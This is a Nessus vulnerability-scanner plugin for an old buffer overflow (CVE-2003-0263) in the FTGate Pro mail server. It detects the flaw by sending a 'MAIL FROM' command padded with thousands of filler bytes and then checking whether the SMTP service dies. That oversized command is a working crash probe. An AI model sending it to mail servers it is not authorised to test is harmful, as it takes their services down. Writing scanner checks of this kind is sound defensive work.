#
# (C) Tenable Network Security, Inc.
#

# Ref:
# From: "Dennis Rand" <der@infowarfare.dk>
# To: "Vulnwatch@Vulnwatch. Org" <vulnwatch@vulnwatch.org>,
# Date: Tue, 6 May 2003 14:57:25 +0200
# Subject: [VulnWatch] Multiple Buffer Overflow Vulnerabilities Found in FTGate Pro Mail Server v. 1.22 (1328)


include("compat.inc");

if (description)
{
 script_id(11579);
 script_version("$Revision: 1.18 $");
 script_cvs_date("$Date: 2016/11/19 01:42:50 $");

 script_cve_id("CVE-2003-0263");
 script_bugtraq_id(7506, 7508);
 script_osvdb_id(12066);

 script_name(english:"FTGatePro Mail Server Multiple Command Remote Overflow");
 script_summary(english:"Checks for FTgate");

 script_set_attribute(attribute:"synopsis", value:
"The remote service is vulnerable to a denial of service.");
 script_set_attribute(attribute:"description", value:
"The remote SMTP server is running FT Gate Pro.

There is a remote stack-based buffer overflow vulnerability in this
version.  This issue can be exploited by supplying a very long
argument to the 'MAIL FROM' and 'RCPT TO' SMTP commands.

A remote attacker could use this to crash the SMTP server, or
possibly execute arbitrary code.");
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/vulnwatch/2003/q2/54"
 );
 script_set_attribute(attribute:"solution", value:
"Upgrade to FTgate Pro Mail Server v. 1.22 Hotfix 1330 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value:"2003/05/06");
 script_set_attribute(attribute:"vuln_publication_date", value:"2003/05/06");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");
 script_family(english:"SMTP problems");

 script_dependencie("smtpserver_detect.nasl");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("smtp_func.inc");
include("misc_func.inc");

if (report_paranoia < 1) exit(0, "This script is prone to false positive.");

port = get_service(svc:"smtp", default: 25, exit_on_fail: 1);
banner = get_smtp_banner(port:port);
if (! banner || "FTGatePro" >!< banner)
 exit(0, "The remote SMTP server is not FTGatePro");

soc = open_sock_tcp(port);
if (!soc) exit(1, "Cannot connect to TCP port "+port+".");

   r = smtp_recv_banner(socket:soc);

   send(socket:soc, data:string("HELO there\r\n"));
   r = recv_line(socket:soc, length:4096);

   send(socket:soc, data:string("MAIL FROM: ", crap(2400), "@", crap(2400),".com\r\n\r\n"));
   r = recv_line(socket:soc, length:4096, timeout:1);
   close(soc);

soc = open_sock_tcp(port);
if (! soc)
{
  if (service_is_dead(port: port) <= 0)	# alive or timeout
    exit(1, "Could not reconnect to port "+port+".");
  security_warning(port:port, extra:string("\nThe remote MTA died.\n"));
  exit(0);
}

   r = smtp_recv_banner(socket:soc);
if( ! r)
 security_warning(port:port, extra:string("\nThe remote MTA does not display its banner anymore.\n"));

   close(soc);

